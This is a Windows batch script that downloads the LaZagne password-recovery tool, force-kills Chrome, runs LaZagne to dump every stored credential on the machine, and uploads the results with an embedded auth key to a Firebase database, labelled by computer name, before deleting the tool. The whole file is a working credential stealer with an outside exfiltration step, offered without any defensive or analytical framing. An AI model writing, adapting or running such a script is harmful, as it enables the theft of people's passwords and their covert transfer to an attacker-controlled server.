@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: Settings
set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

echo ------------------------------------------------------------
echo [INFO] Script started: %DATE% %TIME% (19:48 +03, 14 June 2025)
echo ------------------------------------------------------------

:: 1. LaZagne check and download
echo [1/5] Checking LaZagne...
echo [DEBUG] URL: %LAZAGNE_URL%
if not exist "%LAZAGNE_EXE%" (
    echo   Downloading...
    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
    if errorlevel 1 (
        echo   [ERROR] Download failed! Check details below.
        pause
        exit /b 1
    )
    if not exist "%LAZAGNE_EXE%" (
        echo   [ERROR] File not downloaded, check internet or URL.
        pause
        exit /b 1
    )
    echo   [OK] Successfully downloaded.
) else (
    echo   [OK] Already installed.
)

:: 2. Chrome closure
echo [2/5] Checking browser...
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if %errorlevel% == 0 (
    taskkill /IM chrome.exe /F >nul 2>&1
    echo   [OK] Chrome closed.
) else (
    echo   [INFO] Chrome already closed.
)

:: 3. Output directory creation
echo [3/5] Creating output directory...
if not exist "%OUTPUT_DIR%" (
    mkdir "%OUTPUT_DIR%" 2>nul
    if errorlevel 1 (
        echo   [ERROR] Failed to create directory!
        pause
        exit /b 1
    )
)
echo   [OK] Directory ready: %OUTPUT_DIR%

:: 4. Data collection
echo [4/5] Collecting credentials...
if not exist "%LAZAGNE_EXE%" (
    echo   [ERROR] LaZagne.exe not found!
    pause
    exit /b 1
)
echo   [INFO] Running LaZagne...
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
if errorlevel 1 (
    echo   [ERROR] Error running LaZagne!
    pause
    exit /b 1
)
echo   [OK] LaZagne ran, waiting for output...

:: Check for result file
for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
if not defined RESULT_FILE (
    echo   [ERROR] No result file found! Checking directory: %OUTPUT_DIR%
    dir "%OUTPUT_DIR%"
    pause
    exit /b 1
)
echo   [OK] Result file found: %OUTPUT_DIR%\%RESULT_FILE%

:: 5. Firebase upload
echo [5/5] Uploading to Firebase...
set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"
echo   [DEBUG] PC Name: %PC_NAME%
powershell -Command "$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%'; $json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress; $response=Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'; if($response) { Write-Host '  [OK] Success!' } else { Write-Host '  [ERROR] Upload failed!' }"
if errorlevel 1 (
    echo   [ERROR] Firebase upload failed!
    pause
    exit /b 1
)
echo   [OK] Firebase upload successful!

:: Cleanup
echo [INFO] Cleaning up...
del /q "%LAZAGNE_EXE%" >nul 2>&1
echo   [OK] Cleanup completed.

:: Final message
echo ------------------------------------------------------------
echo [INFO] Process completed: %DATE% %TIME%
echo Firebase location: %FIREBASE_URL%/%PC_NAME%
echo ------------------------------------------------------------
exit /b 0
